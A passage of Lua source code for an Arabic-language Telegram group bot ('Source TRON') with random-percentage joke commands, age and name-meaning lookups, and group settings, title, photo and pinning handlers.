Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source TRON     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل اوامر النسب'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Nsba:Abd'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل اوامر النسب'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Nsba:Abd'..msg.chat_id_,true)  
end
if not DevAbd:get(TRON..'Abd:Nsba:Abd'..msg.chat_id_) then
if text == "نسبه الحب" and SourceCh(msg) or text == "نسبة الحب" and SourceCh(msg) then
DevAbd:set(TRON..'LoveNsba:Abd'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevAbd:get(TRON..'LoveNsba:Abd'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الحب ', 1, 'md')
DevAbd:del(TRON..'LoveNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abd = math.random(0,100);
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الحب بين '..text..' هي : '..Abd..'%', 1, 'md')
DevAbd:del(TRON..'LoveNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbd:get(TRON..'Abd:Nsba:Abd'..msg.chat_id_) then
if text == "نسبه الكره" and SourceCh(msg) or text == "نسبة الكره" and SourceCh(msg) then
DevAbd:set(TRON..'HataNsba:Abd'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevAbd:get(TRON..'HataNsba:Abd'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الكره ', 1, 'md')
DevAbd:del(TRON..'HataNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abd = math.random(0,100);
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙نسبة الكره بين '..text..' هي : '..Abd..'%', 1, 'md')
DevAbd:del(TRON..'HataNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbd:get(TRON..'Abd:Nsba:Abd'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SourceCh(msg) then
DevAbd:set(TRON..'RjolaNsba:Abd'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevAbd:get(TRON..'RjolaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevAbd:del(TRON..'RjolaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abd = math.random(0,100);
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙نسبة رجولة '..text..' هي : '..Abd..'%', 1, 'md')
DevAbd:del(TRON..'RjolaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbd:get(TRON..'Abd:Nsba:Abd'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SourceCh(msg) then
DevAbd:set(TRON..'AnothaNsba:Abd'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevAbd:get(TRON..'AnothaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevAbd:del(TRON..'AnothaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abd = math.random(0,100);
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙نسبة انوثة '..text..' هي : '..Abd..'%', 1, 'md')
DevAbd:del(TRON..'AnothaNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbd:get(TRON..'Abd:Nsba:Abd'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and SourceCh(msg) then
DevAbd:set(TRON..'StupidNsba:Abd'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevAbd:get(TRON..'StupidNsba:Abd'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevAbd:del(TRON..'StupidNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abd = math.random(0,100);
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙نسبة غباء '..text..' هي : '..Abd..'%', 1, 'md')
DevAbd:del(TRON..'StupidNsba:Abd'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source TRON     --
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل حساب العمر'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Age:Abd'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل حساب العمر'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Age:Abd'..msg.chat_id_,true)  
end
if not DevAbd:get(TRON..'Abd:Age:Abd'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and SourceCh(msg) or text and text:match("^عمري (.*)$") and SourceCh(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiAbd.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.Abd
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source TRON     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل معاني الاسماء'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Mean:Abd'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل معاني الاسماء'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Mean:Abd'..msg.chat_id_,true)  
end
if not DevAbd:get(TRON..'Abd:Mean:Abd'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiAbd.ml/Mean.php?Abd='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.Abd
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source TRON     --
if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل غنيلي بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Audios:Abd'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل غنيلي بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Audios:Abd'..msg.chat_id_,true)  
end
if text == "غنيلي" and not DevAbd:get(TRON..'Abd:Audios:Abd'..msg.chat_id_) and SourceCh(msg) then
data,res = https.request('https://apiAbd.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='⌁︙تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌁ TRON TeAM .',url="t.me/YYYYAX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
--     Source TRON     --
if Admin(msg) then
if DevAbd:get(TRON..'Abd:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevAbd:get(TRON..'Abd:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الملصقات" then if DevAbd:get(TRON..'Abd:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الصور" then if DevAbd:get(TRON..'Abd:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevAbd:get(TRON..'Abd:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الاونلاين" then if DevAbd:get(TRON..'Abd:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الدردشه" then if DevAbd:get(TRON..'Abd:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الاغاني" then if DevAbd:get(TRON..'Abd:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevAbd:get(TRON..'Abd:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevAbd:get(TRON..'Abd:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الماركداون" then if DevAbd:get(TRON..'Abd:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الهاشتاك" then if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "التعديل" then if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "التثبيت" then if DevAbd:get(TRON..'Abd:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الاشعارات" then if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الكلايش" then if DevAbd:get(TRON..'Abd:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الدخول" then if DevAbd:get(TRON..'Abd:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local TRONTEAM = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الشبكات" then if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "المواقع" then if DevAbd:get(TRON..'Abd:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "العربيه" then if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الانكليزيه" then if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local TRONTEAM = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الكفر" then if DevAbd:get(TRON..'Abd:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local TRONTEAM = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الفشار" then if DevAbd:get(TRON..'Abd:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local TRONTEAM = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
if text == "الطائفيه" then if DevAbd:get(TRON..'Abd:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local TRONTEAM = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_Abd(msg.chat_id_, msg.id_, 1, TRONTEAM, 1, 'md') end
end
--     Source TRON     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:LockSettings'..msg.chat_id_) 
end
--     Source TRON     --
if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل اوامر التحشيش'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل اوامر التحشيش'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Stupid'..msg.chat_id_,true)
end
--     Source TRON     --
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل التحقق بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل التحقق بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Robot'..msg.chat_id_,true)
end
--     Source TRON     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل ردود المدير'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل ردود المدير'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:GpRed'..msg.chat_id_,true)
end
--     Source TRON     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل ردود المطور'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل ردود المطور'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:AllRed'..msg.chat_id_,true)
end
--     Source TRON     --
if SecondSudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌁' then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل المغادره بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON.."Abd:Left:Bot"..TRON)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌁' then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل المغادره بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON.."Abd:Left:Bot"..TRON,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ⌁' then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الاذاعه بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON.."Abd:Send:Bot"..TRON)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ⌁' then 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الاذاعه بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON.."Abd:Send:Bot"..TRON,true) 
end
end
--     Source TRON     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"⌁︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌁︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تغير اسم المجموعه'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source TRON     --
if msg.content_.photo_ then
if DevAbd:get(TRON..'Abd:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"⌁︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevAbd:del(TRON..'Abd:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"⌁︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevAbd:del(TRON..'Abd:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تغير صورة المجموعه'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevAbd:del(TRON..'Abd:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, '⌁︙ارسل صورة المجموعه الان', 1, 'md')
DevAbd:set(TRON..'Abd:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source TRON     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف صورة المجموعه")  
return false  
end
--     Source TRON     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevAbd:sismember(TRON.."Abd:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevAbd:del(TRON..'Abd:PinnedMsg'..msg.chat_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم الغاء تثبيت الرساله'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌁︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
